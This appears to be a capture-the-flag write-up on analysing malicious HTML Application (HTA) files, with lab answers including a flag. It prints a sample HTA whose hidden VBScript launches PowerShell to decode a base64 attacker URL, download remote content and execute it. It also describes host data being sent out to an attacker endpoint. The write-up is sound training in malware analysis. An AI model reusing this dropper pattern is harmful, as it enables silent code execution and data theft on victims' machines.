# HTA 
Stands for HTML Application ->  a small desktop app built using familiar web technologies such as HTML, CSS, and JavaScript

Unlike regular web pages that open inside a browser, HTA files run directly on Windows through a built-in component called Microsoft HTML Application Host - mshta.exe process4

## Purpose
- Automating administrative or setup tasks.
- Providing quick interfaces for internal scripts.
- Testing small prototypes without building full software.
- Offering lightweight IT support utilities for daily use.

# HTA File strucure
1. HTA Declaration 
2. Interface (HTML and CSS)
3. Script(VBScript or JavaScript)

```
<html>
<head>
    <title>TBFC Utility Tool</title>
    <HTA:APPLICATION 
        ID="TBFCApp"
        APPLICATIONNAME="Utility Tool"
        BORDER="thin"
        CAPTION="yes"
        SHOWINTASKBAR="yes"
    />
</head>

<body>
    <h3>Welcome to the TBFC Utility Tool</h3>
    <input type="button" value="Say Hello" onclick="MsgBox('Hello from Wareville!')">
</body>
</html>
```

### Common purpose of malicious HTA use
- Initial access/delivery: often delivered by phishing and run via `mshta.exe`
- Downloaders/ droppers -> HTA can execute script that fetches additional binaries or scripts from the attacker's C2
- Obfuscation/evasion : hidden by  embedding encoded
- Living-off-the-land: calls built-in Windows tools (`mshta.exe`, `powershell.exe`, ` wscript.exe`, `rundll32.exe`) to avoid adding new binaries to disk

## Example
```
<html>
  <head>
    <title>Angry King Malhare</title>
    <HTA:APPLICATION ID="Malhare" APPLICATIONNAME="B" BORDER="none" 
     SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
    </HTA:APPLICATION>
    <script language="VBScript">
      Option Explicit:Dim a:Set a=CreateObject("WScript.Shell"):Dim 
      b:b="powershell -NoProfile -ExecutionPolicy Bypass -Command "" 
      {$U=
      [System.Text.Encoding]::UTF8.GetString([System.Convert]::
      FromBase64String('aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0')) 
      $C=(Invoke-WebRequest -Uri 
      $U -UseBasicParsing).Content 
      $B=[scriptblock]::Create($C) $B}""":a.Run 
      b,0,True:self.close
    </script>
  </head>
  <body>
  </body>
</html>
```


What is the title of the HTA application?
<img width="621" height="31" alt="Screenshot 2025-12-22 134618" src="https://github.com/user-attachments/assets/3ce7c18e-8551-4a85-b8ac-e99b1a2615d2" />

What VBScript function is acting as if it is downloading the survey questions?
`getQuestions`

What URL domain (including sub-domain) is the "questions" being downloaded from?
<img width="598" height="25" alt="Screenshot 2025-12-22 134605" src="https://github.com/user-attachments/assets/f5bd3e41-30de-48c7-a263-adeeed9182ce" />

Malhare seems to be using typosquatting, domains that look the same as the real one, in an attempt to hide the fact that the domain is not the inteded one, what character in the domain gives this away?
`i`
Seems that the character `i` is repeated

Malicious HTAs often include real-looking data, like survey questions, to make the file seem authentic. How many questions does the survey have?
<img width="799" height="182" alt="Screenshot 2025-12-22 134547" src="https://github.com/user-attachments/assets/17f5c7e0-6567-4f78-9519-557fbb2eab69" />

Notice how even in code, social engineering persists, fake incentives like contests or trips hide in plain sight to build trust. The survey entices participation by promising a chance to win a trip to where?
<img width="795" height="42" alt="Screenshot 2025-12-22 134505" src="https://github.com/user-attachments/assets/3bb94a2b-29b4-4378-97c4-378485b68078" />


The HTA is enumerating information from the local host executing the application. What two pieces of information about the computer it is running on are being exfiltrated? You should provide the two object names separated by commas.
<img width="621" height="54" alt="Screenshot 2025-12-22 135122" src="https://github.com/user-attachments/assets/ad76d3bf-72ce-4725-9f57-c413268004fb" />

What endpoint is the enumerated data being exfiltrated to?
<img width="746" height="46" alt="Screenshot 2025-12-22 135229" src="https://github.com/user-attachments/assets/0e7de752-e875-4e2a-b7c9-c0bd90e2e395" />


What HTTP method is being used to exfiltrate the data?
`GET`

After reviewing the function intended to get the survey questions, it seems that the data from the download of the questions is actually being executed. What is the line of code that executes the contents of the download?
<img width="764" height="45" alt="Screenshot 2025-12-22 140407" src="https://github.com/user-attachments/assets/14d1ba43-cb0b-46d4-8ef3-b922d200335b" />


It seems as if the malware site has been taken down, so we cannot download the contents that the malware was executing. Fortunately, one of the elves created a copy when the site was still active. Download the contents from here. What popular encoding scheme was used in an attempt to obfuscate the download?
`base64`

Decode the payload. It seems as if additional steps where taken to hide the malware! What common encryption scheme was used in the script?
`ROT13`


Either run the script or decrypt the flag value using online tools such as CyberChef. What is the flag value?

`THM{Malware.Analysed}`





















